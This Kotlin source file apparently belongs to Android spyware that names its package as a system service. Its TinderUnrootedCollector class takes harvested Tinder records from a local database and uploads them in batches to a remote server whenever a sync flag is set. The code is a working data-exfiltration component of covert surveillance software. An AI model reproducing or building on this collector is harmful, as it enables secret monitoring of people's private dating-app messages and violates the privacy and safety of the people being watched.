package com.android.services.logs.collectors.im.unrooted


import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerThreeApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose

class TinderUnrootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncTinder) {
            try {
                val tinderUnrootedList = localDatabaseSource.selectTinderUnrooteds()
                if (tinderUnrootedList.isNotEmpty()) {
                    val endId = tinderUnrootedList[tinderUnrootedList.size - 1].id
                    val startId = tinderUnrootedList[0].id
                    val mTinderSender = RemoteServerHelper(
                        context,
                        AppConstants.TINDER_UNROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startId = startId,
                        endId = endId
                    )
                    mTinderSender.upload(tinderUnrootedList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.TINDER_UNROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.TINDER_UNROOTED_TYPE} Sync is Off")
        }
    }
}